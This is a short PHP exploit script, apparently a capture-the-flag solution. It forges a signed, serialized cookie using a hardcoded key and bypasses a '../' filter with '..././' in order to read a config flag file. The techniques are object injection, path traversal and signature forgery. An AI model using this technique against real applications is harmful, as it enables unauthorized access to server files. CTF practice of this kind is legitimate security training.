<?php
Class Application {
    var $path = '../config/flag.txt';
}
$eancrykey='EzblrbNS';
$app=new Application();
$app->path=str_replace('../','..././',$app->path);
$cookiedata = serialize($app);
$cookiedata = $cookiedata.md5($eancrykey.$cookiedata);
echo urlencode($cookiedata);
?>
